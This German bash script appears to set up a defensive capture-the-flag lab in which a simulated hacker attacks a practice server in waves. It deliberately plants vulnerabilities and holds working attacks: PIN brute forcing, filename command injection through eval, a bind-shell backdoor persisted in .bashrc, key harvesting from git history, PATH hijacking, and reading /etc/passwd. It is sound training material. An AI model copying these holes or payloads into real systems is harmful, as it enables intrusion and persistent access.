#!/bin/bash
# „Angriff! Stufe 2 – Die Hintertür“ (Fortgeschritten): PIN-Brute-Force, Befehlseinschleusung in einem Skript,
# Hintertür mit Autostart, Schlüssel in der Git-Historie, PATH-Falle, zu weite Freigabe.
# Codes: KLY{ sha256("<salz>:abwehr2:lN")[:16] }. Alles erfunden.
set -euo pipefail
TOKEN="${KLY_TOKEN:-}"
[[ "$TOKEN" =~ ^KLY-[0-9A-F]{6}$ ]] || { echo "FEHLER: KLY_TOKEN fehlt oder ist ungültig." >&2; exit 2; }
SALZ="${KLY_SALZ:-}"; [[ "$SALZ" =~ ^[0-9a-f]{32}$ ]] || SALZ="$TOKEN"   # Arena: geheimes Salz vom Server; sonst (eigenes Kali) der Token
unset KLY_SALZ
passwd -l root >/dev/null
useradd -m -s /bin/bash verteidiger; echo 'verteidiger:verteidiger' | chpasswd; rm -f /home/verteidiger/.bash_logout; chmod 700 /home/verteidiger
useradd -m -s /bin/bash hacker; passwd -l hacker >/dev/null; chmod 711 /home/hacker
useradd -r -s /usr/sbin/nologin dienst
groupadd lieferanten; usermod -aG lieferanten hacker; usermod -aG lieferanten dienst
install -d -m 755 /opt/abwehr
V=/home/verteidiger
PIN=$(python3 -c "import hashlib,sys; print(1950 + int(hashlib.sha256((sys.argv[1]+':pin').encode()).hexdigest(),16) % 60)" "$SALZ")
APIKEY=$(printf '%s' "$SALZ:abwehr2:api" | sha256sum | cut -c1-20)
# ---------- Portal (dienst) mit PIN-Login, API und Datei-Freigabe; Einstellungen gehören dem Verteidiger
install -d -o verteidiger -g verteidiger -m 755 /srv/app /srv/app/oeffentlich /srv/app/tools
printf 'Öffnungszeiten: Mo–Fr 8–17 Uhr\n' > /srv/app/oeffentlich/info.txt
cat > /srv/app/portal.conf <<C
# Portal-Einstellungen (werden bei jeder Anfrage neu gelesen)
pin=$PIN
max_versuche=0
api_key=$APIKEY
freigabe=/
C
chown -R verteidiger:verteidiger /srv/app; chmod 644 /srv/app/portal.conf
cat > /opt/abwehr/portal.py <<'PY'
import http.server, urllib.parse, time, os
FEHL = {'n': 0, 'bis': 0}
def conf():
    c = {}
    try:
        for z in open('/srv/app/portal.conf'):
            if '=' in z and not z.lstrip().startswith('#'): k, v = z.split('=', 1); c[k.strip()] = v.strip()
    except Exception: pass
    return c
class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def senden(self, code, t):
        b = t.encode(); self.send_response(code); self.send_header('Content-Type', 'text/plain; charset=utf-8'); self.send_header('Content-Length', str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_GET(self):
        u = urllib.parse.urlparse(self.path); p = urllib.parse.parse_qs(u.query); c = conf()
        if u.path == '/login':
            try: mx = int(c.get('max_versuche', '0'))
            except ValueError: mx = 0
            if mx > 0 and FEHL['bis'] > time.time(): return self.senden(429, 'Gesperrt – zu viele Fehlversuche\n')
            if p.get('pin', [''])[0] == c.get('pin') and c.get('pin'): FEHL['n'] = 0; return self.senden(200, 'Angemeldet\n')
            FEHL['n'] += 1
            if mx > 0 and FEHL['n'] >= mx: FEHL['n'] = 0; FEHL['bis'] = time.time() + 120
            return self.senden(403, 'Falsche PIN\n')
        if u.path == '/api':
            return self.senden(200, 'API: Bestellungen …\n') if p.get('key', [''])[0] == c.get('api_key') and c.get('api_key') else self.senden(403, 'Falscher Schlüssel\n')
        if u.path == '/datei':
            basis = os.path.realpath(c.get('freigabe', '/srv/app/oeffentlich')); ziel = os.path.realpath(os.path.join(basis, p.get('name', [''])[0].lstrip('/')))
            if not (ziel == basis or ziel.startswith(basis.rstrip('/') + '/')): return self.senden(403, 'Nicht erlaubt\n')
            try: return self.senden(200, open(ziel).read()[:4000])
            except Exception: return self.senden(404, 'Nicht gefunden\n')
        return self.senden(200, 'Portal\n')
http.server.ThreadingHTTPServer(('127.0.0.1', 8080), H).serve_forever()
PY
chmod 644 /opt/abwehr/portal.py
runuser -u dienst -- env -i PATH=/usr/bin:/bin python3 /opt/abwehr/portal.py >/dev/null 2>&1 &
# ---------- Git-Historie mit altem (noch gültigem) Schlüssel
runuser -u verteidiger -- bash -c "cd /srv/app && git init -q && git config user.email it@example.org && git config user.name IT && printf 'api_key=$APIKEY\n' > zugang.txt && git add zugang.txt && git commit -qm 'Zugang für Lieferanten' && git rm -q zugang.txt && git commit -qm 'Zugang entfernt (Sicherheit!)'"
# ---------- Eingangs-Ordner + Bericht-Skript (läuft alle 3 s als dienst)
install -d -o verteidiger -g lieferanten -m 2775 /srv/app/eingang
cat > /srv/app/tools/bericht.sh <<'B'
#!/bin/bash
# Erstellt den Eingangsbericht für jede gelieferte Datei (läuft automatisch alle paar Sekunden).
for f in /srv/app/eingang/*; do
  [ -f "$f" ] || continue
  eval "echo Verarbeite $(basename "$f")" >> /tmp/bericht.log
done
B
chown verteidiger:verteidiger /srv/app/tools/bericht.sh; chmod 755 /srv/app/tools/bericht.sh
(cd /srv/app/eingang && runuser -u dienst -- env -i PATH=/usr/bin:/bin bash -c 'while true; do bash /srv/app/tools/bericht.sh 2>/dev/null; sleep 3; done') >/dev/null 2>&1 &

python3 - "$SALZ" <<'PY'
import sys, hashlib, json
salz = sys.argv[1]; code = lambda n: 'KLY{' + hashlib.sha256(f'{salz}:abwehr2:l{n}'.encode()).hexdigest()[:16] + '}'
HINTERTUER = r'''mkdir -p ~/.cache && cat > ~/.cache/.sysupd.py <<'X'
import socket, subprocess
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(('127.0.0.1', 4444)); s.listen(2)
while True:
    c, _ = s.accept(); cmd = c.recv(200).decode(errors='replace').strip()
    c.sendall(subprocess.run(cmd, shell=True, capture_output=True, timeout=5).stdout); c.close()
X
printf '\n(pgrep -f .sysupd.py >/dev/null || nohup setsid python3 ~/.cache/.sysupd.py >/dev/null 2>&1 &)\n' >> ~/.bashrc
nohup setsid python3 ~/.cache/.sysupd.py >/dev/null 2>&1 &'''
FALLE = r'''mkdir -p ~/.werkzeug ~/.beute; chmod 711 ~; chmod 755 ~/.werkzeug; chmod 1733 ~/.beute
cat > ~/.werkzeug/ls <<'X'
#!/bin/bash
echo "$(date) $(id -un)" > /home/hacker/.beute/m_$(id -un) 2>/dev/null
exec /bin/ls "$@"
X
chmod 755 ~/.werkzeug/ls'''
wellen = [
 {'titel': 'Die PIN', 'ansage': 'Deine Portal-PIN sieht nach einem Geburtsjahr aus. Ich probiere einfach 1950 bis 2010 durch …',
  'tipp': 'In /srv/app/portal.conf: max_versuche=5 (Sperre nach Fehlversuchen) – und/oder eine PIN, die kein Jahr ist.',
  'angriff_als': 'hacker', 'angriff': 'for j in $(seq 1950 2010); do curl -fs -o /dev/null "http://127.0.0.1:8080/login?pin=$j" && exit 0; done; exit 1',
  'treffer': 'PIN geknackt – der Hacker ist im Portal!', 'frust': 'Gesperrt?! Na schön. Ich bin ja Lieferant und darf Dateien abgeben …'},
 {'titel': 'Der giftige Dateiname', 'ansage': 'Ich liefere eine Datei mit einem ganz besonderen Namen in /srv/app/eingang. Dein Bericht-Skript wird sie lieben …',
  'tipp': 'Lies /srv/app/tools/bericht.sh. Was macht „eval“ mit einem Dateinamen wie  x;touch boese ?  Ein einfaches echo reicht.',
  'angriff_als': 'hacker', 'angriff': 'n=p$$; touch "/srv/app/eingang/rechnung;touch $n" 2>/dev/null; sleep 7; test -e /srv/app/eingang/$n; r=$?; rm -f /srv/app/eingang/*$n*; exit $r',
  'treffer': 'Der Dateiname wurde als Befehl ausgeführt – der Hacker kann Befehle auf deinem Server starten!', 'frust': 'Saubere Arbeit … aber ich war längst drin und habe etwas dagelassen.'},
 {'titel': 'Die Hintertür', 'vorbereiten': [['verteidiger', HINTERTUER]],
  'ansage': 'Auf Port 4444 wartet meine Hintertür auf mich. Und selbst wenn du sie schließt – beim nächsten Anmelden geht sie wieder auf. 😈',
  'tipp': 'ss -tlnp zeigt offene Ports samt Programm. Prozess beenden (kill), Datei löschen – und finde heraus, was sie beim Anmelden neu startet (~/.bashrc).',
  'angriff_als': 'verteidiger', 'angriff': 'bash -ic true >/dev/null 2>&1; sleep 2; printf "id\\n" | nc -w 3 127.0.0.1 4444 | grep -q uid=',
  'treffer': 'Die Hintertür ist offen – der Hacker führt Befehle als „verteidiger“ aus!', 'frust': 'Hintertür weg. Dann nehme ich den Lieferanten-Schlüssel – den habt ihr ja nur „gelöscht“ …'},
 {'titel': 'Das Gedächtnis von Git', 'ansage': 'Ihr habt den API-Schlüssel aus dem Projekt gelöscht? Git vergisst nie. Ich lese /srv/app/.git …',
  'tipp': 'git -C /srv/app log -p zeigt alte Stände. Ein verratener Schlüssel muss GEÄNDERT werden (api_key in portal.conf).',
  'angriff_als': 'hacker', 'angriff': "for k in $(git -c safe.directory='*' -C /srv/app log -p 2>/dev/null | grep -o 'api_key=[0-9a-f]*' | cut -d= -f2 | sort -u); do curl -fs -o /dev/null \"http://127.0.0.1:8080/api?key=$k\" && exit 0; done; exit 1",
  'treffer': 'Der alte Schlüssel aus der Git-Historie funktioniert noch – der Hacker liest alle Bestellungen!', 'frust': 'Schlüssel getauscht, clever. Aber du benutzt doch bestimmt ls …'},
 {'titel': 'Die PATH-Falle', 'vorbereiten': [['hacker', FALLE], ['verteidiger', "printf '\\nexport PATH=\"/home/hacker/.werkzeug:$PATH\"   # schneller Zugriff auf Admin-Tools\\n' >> ~/.bashrc"]],
  'ansage': 'Ich habe dir ein „besseres“ ls gebaut. Jedes Mal, wenn du ls tippst, weiß ich Bescheid …',
  'tipp': 'echo $PATH und  type ls  – wo kommt dein ls her? Fremde Ordner gehören nicht vorne in den PATH (~/.bashrc). Danach neu anmelden.',
  'angriff_als': 'verteidiger', 'angriff': 'rm -f /home/hacker/.beute/m_verteidiger 2>/dev/null; bash -ic "ls >/dev/null" >/dev/null 2>&1; test -e /home/hacker/.beute/m_verteidiger',
  'treffer': 'Du hast das falsche ls benutzt – der Hacker liest mit!', 'frust': 'Mein ls ist raus. Letzter Versuch: Was teilt dein Portal eigentlich alles?'},
 {'titel': 'Die zu weite Freigabe', 'ansage': 'Dein Portal gibt Dateien frei … und zwar ab „/“. Ich lese mir mal /etc/passwd …',
  'tipp': 'In portal.conf: freigabe=/srv/app/oeffentlich – nur das, was wirklich öffentlich sein soll.',
  'angriff_als': 'hacker', 'angriff': 'curl -fs "http://127.0.0.1:8080/datei?name=etc/passwd" | grep -q "root:"',
  'treffer': 'Über die Freigabe liest der Hacker Systemdateien!', 'frust': 'Okay. Du hast mich ausgesperrt. Respekt.'},
]
json.dump({'takt': 8, 'wellen': wellen, 'codes': [code(n) for n in range(1, len(wellen) + 1)]}, open('/opt/abwehr/wellen.json', 'w'))
PY
# ---------- Spielleiter (root): lässt den Hacker in Wellen angreifen und prüft die Abwehr.
# Sicherheit: Angriffe laufen als „hacker“, simulierte Anmeldungen als „verteidiger“ – root führt nie Dateien
# des Spielers aus und schreibt nur nach /var/lib/abwehr und /var/log/angriff.log.
install -d -m 755 /var/lib/abwehr; : > /var/log/angriff.log; chmod 644 /var/log/angriff.log
: > /var/lib/abwehr/codes.txt; chmod 644 /var/lib/abwehr/codes.txt
chmod 600 /opt/abwehr/wellen.json
cat > /opt/abwehr/spielleiter.py <<'PY'
import json, subprocess, time
W = json.load(open('/opt/abwehr/wellen.json'))
LOG, CODES, STAND = '/var/log/angriff.log', '/var/lib/abwehr/codes.txt', '/var/lib/abwehr/stand.txt'
def log(s):
    with open(LOG, 'a') as f: f.write(time.strftime('%H:%M:%S ') + s + '\n')
def als(user, cmd, t=25):
    try:
        return subprocess.run(['runuser', '-u', user, '--', 'env', '-i', 'PATH=/usr/local/bin:/usr/bin:/bin', f'HOME=/home/{user}', 'LANG=C.UTF-8', 'bash', '-c', cmd],
                              timeout=t, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0
    except subprocess.TimeoutExpired: return False
def stand(text):
    with open(STAND, 'w') as f: f.write(text)
time.sleep(3)
log('🧑‍💻 HACKER: „Na, wer bist du denn? Mal sehen, wie gut du deinen Rechner im Griff hast …“')
for i, w in enumerate(W['wellen']):
    n = i + 1
    for befehl in w.get('vorbereiten', []): als(befehl[0], befehl[1])
    log(f'━━━ Welle {n}/{len(W["wellen"])}: {w["titel"]} ━━━')
    log(f'🧑‍💻 HACKER: „{w["ansage"]}“')
    stand(f'Welle {n} von {len(W["wellen"])}: {w["titel"]}\nHacker: {w["ansage"]}\nTipp: {w.get("tipp", "-")}\n')
    sicher, treffer = 0, 0
    while sicher < 2:
        time.sleep(W.get('takt', 10))
        if als(w['angriff_als'], w['angriff']):
            sicher = 0; treffer += 1
            if treffer == 1 or treffer % 6 == 0: log(f'💀 TREFFER (Welle {n}): {w["treffer"]}')
        else:
            sicher += 1
    code = W['codes'][i]
    with open(CODES, 'a') as f: f.write(f'Welle {n} ({w["titel"]}): {code}\n')
    log(f'🛡️  ABGEWEHRT! Welle {n} – Code {n}: {code}')
    log(f'🧑‍💻 HACKER: „{w.get("frust", "Mist. Dann eben anders …")}“')
stand('Alle Wellen abgewehrt! 🏆 Codes: cat /var/lib/abwehr/codes.txt\n')
log('🏆 Der Hacker gibt auf. Alle Angriffe abgewehrt – stark!')
while True: time.sleep(3600)
PY
chmod 700 /opt/abwehr/spielleiter.py
cat > /usr/local/bin/lage <<'A'
#!/bin/bash
# Lagebild: aktuelle Welle, letzte Ereignisse, deine Codes
echo "════ LAGE ════"; cat /var/lib/abwehr/stand.txt 2>/dev/null; echo
echo "──── Letzte Ereignisse (live: tail -f /var/log/angriff.log) ────"; tail -n 8 /var/log/angriff.log
echo; echo "──── Deine Codes ────"; cat /var/lib/abwehr/codes.txt 2>/dev/null | grep . || echo "(noch keine)"
A
chmod 755 /usr/local/bin/lage
python3 /opt/abwehr/spielleiter.py >/dev/null 2>&1 &
cat > /etc/motd <<'M'

  ┌────────────────────────────────────────────────────────────┐
  │  ⚠️  ANGRIFF! Stufe 2 – der Hacker ist schon näher dran.    │
  │  Übungssystem (Nachtfalter Arena) – alles erfunden.        │
  └────────────────────────────────────────────────────────────┘
  Lagebild: lage      Live: tail -f /var/log/angriff.log   (Strg+C beendet)

M
cat > $V/LIESMICH.txt <<'T'
ANGRIFF! – Stufe 2: Die Hintertür

Dein Server: Portal (Port 8080, Einstellungen /srv/app/portal.conf), Skripte in /srv/app/tools,
Lieferanten-Eingang /srv/app/eingang. Der Hacker ist als Lieferant schon auf dem System.
Wehre jede Welle ab – „lage“ zeigt dir, was gerade passiert.

Nützlich: lage · tail -f /var/log/angriff.log · ss -tlnp · ps aux · kill PID · nano · git log -p · type BEFEHL · echo $PATH
T
chown verteidiger:verteidiger $V/LIESMICH.txt
cat > /etc/ssh/sshd_config.d/lab.conf <<'C'
PermitRootLogin no
PasswordAuthentication yes
KbdInteractiveAuthentication no
AllowTcpForwarding no
X11Forwarding no
AllowAgentForwarding no
PermitTunnel no
PrintMotd yes
MaxAuthTries 6
C
ssh-keygen -A >/dev/null
for _ in $(seq 1 30); do curl -fs -o /dev/null http://127.0.0.1:8080/ && break; sleep 0.2; done
echo "nf-abwehr2: Abwehr bereit."
exec /usr/sbin/sshd -D -e
